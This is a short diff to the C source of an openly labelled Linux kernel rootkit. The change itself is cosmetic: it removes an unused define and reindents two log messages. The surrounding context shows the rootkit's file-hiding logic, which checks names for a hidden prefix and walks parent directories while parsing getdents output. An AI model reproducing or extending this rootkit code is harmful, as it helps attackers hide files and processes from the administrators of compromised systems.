@@ -15,8 +15,6 @@
 // dirent.h lacks some includes, so we include it last
 #include <linux/dirent.h>
 
-#define LOOKUP_PARENTS 0x10000000 /* Lookup only parent directories */
-
 /**
  * Structure representing a directory entry (legacy; deprecated and removed from the kernel).
  * @note This is used to parse the output of the `getdents` syscall.
@@ -335,7 +333,7 @@ static inline bool is_filename_or_pid_hidden(const char *const s_filename,
 
     // Check the name starts with the hidden prefix
     IF_U (is_filename_hidden(s_filename)) {
-        pr_info("[ROOTKIT] * This file name starts with the hidden prefix\n");
+        pr_info("[ROOTKIT]   * This file name starts with the hidden prefix\n");
         return true;
     }
 
@@ -376,7 +374,7 @@ static inline bool is_dentry_hierarchy_hidden(const dentry_t *const p_dentry)
     p_parent = p_dentry->d_parent;
     while (!IS_ROOT(p_parent)) {
         if (is_filename_hidden(p_parent->d_name.name)) {
-            pr_info("[ROOTKIT] * Parent directory is hidden: %s\n", p_parent->d_name.name);
+            pr_info("[ROOTKIT]   * Parent directory is hidden: %s\n", p_parent->d_name.name);
             return true;
         }
 
